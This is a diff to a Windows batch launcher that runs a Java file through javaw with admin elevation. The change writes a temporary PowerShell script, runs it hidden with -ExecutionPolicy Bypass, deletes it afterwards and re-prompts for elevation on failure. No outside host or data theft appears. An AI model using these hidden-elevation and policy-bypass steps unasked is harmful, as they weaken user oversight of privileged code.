@@ -107,8 +107,17 @@ if not defined JAVAW_PATH (
     exit
 )
 
+:: Create PowerShell script to run with admin
+set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
+(
+echo $javaPath = "%JAVAW_PATH%"
+echo $javaFile = "%JAVA_FILE%"
+echo if ^(^[string^]::IsNullOrEmpty^($javaPath^)^) { exit 1 }
+echo Start-Process -FilePath $javaPath -ArgumentList $javaFile -Verb RunAs -WindowStyle Hidden
+) > "%PS_SCRIPT%"
+
 :: Run with javaw (no console) and request admin elevation
-powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "& {$javaPath = '%JAVAW_PATH%'; $javaFile = '%JAVA_FILE%'; $tempPath = '%TEMP%'; if ([string]::IsNullOrEmpty($javaPath)) { exit 1 }; $p = Start-Process -FilePath $javaPath -ArgumentList $javaFile -WorkingDirectory $tempPath -Verb RunAs -PassThru -ErrorAction SilentlyContinue; if (-not $p) { exit 1 }}"
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
 
 if errorlevel 1 (
     echo.
@@ -116,5 +125,8 @@ if errorlevel 1 (
     timeout /t 2 /nobreak >nul
     goto request_admin
 )
+
+:: Clean up
+del "%PS_SCRIPT%" 2>nul
 
 exit
